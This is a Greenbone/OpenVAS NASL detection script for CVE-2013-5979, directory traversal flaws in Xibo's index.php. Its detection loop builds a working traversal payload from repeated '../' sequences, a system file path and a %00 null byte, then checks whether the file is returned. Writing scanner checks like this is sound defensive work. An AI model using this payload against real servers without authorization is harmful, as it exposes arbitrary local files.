if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103797" );
	script_bugtraq_id( 61352 );
	script_cve_id( "CVE-2013-5979" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Xibo 'index.php' Multiple Directory Traversal Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/61352" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-10-07 11:05:49 +0200 (Mon, 07 Oct 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "An attacker can exploit these issues using directory-traversal strings
to retrieve arbitrary files outside of the webserver root directory.
This may aid in further attacks" );
	script_tag( name: "vuldetect", value: "Using directory-traversal strings in a HTTP GET request to determine
if it is possible to access a local file." );
	script_tag( name: "insight", value: "Directory traversal vulnerabilities occur when user input is
used in the construction of a filename or directory path which is subsequently
used in some system function. If the input is not correctly validated or
directory permissions not correctly set, it may be possible to cause a different
file to be accessed other than that intended. This issue was exploited by adding a
null byte (%00) which resulted in the application ignoring the rest of the supplied
value after the null byte." );
	script_tag( name: "solution", value: "Upgrade to Xibo 1.4.2 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Xibo is prone to multiple directory-traversal vulnerabilities because
it fails to properly sanitize user-supplied input." );
	script_tag( name: "affected", value: "Xibo 1.2.2 and 1.4.1 are vulnerable, other versions may also be
affected." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/xibo", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/index.php";
	buf = http_get_cache( item: url, port: port );
	if(ContainsString( buf, "<title>Xibo Admin - Please Login" )){
		for file in keys( files ) {
			url = dir + "/index.php?p=" + crap( data: "../", length: 9 * 6 ) + files[file] + "%00index&amp;q=About&amp;ajax=true&amp;_=1355779988 ";
			if(http_vuln_check( port: port, url: url, pattern: file )){
				report = http_report_vuln_url( port: port, url: url );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

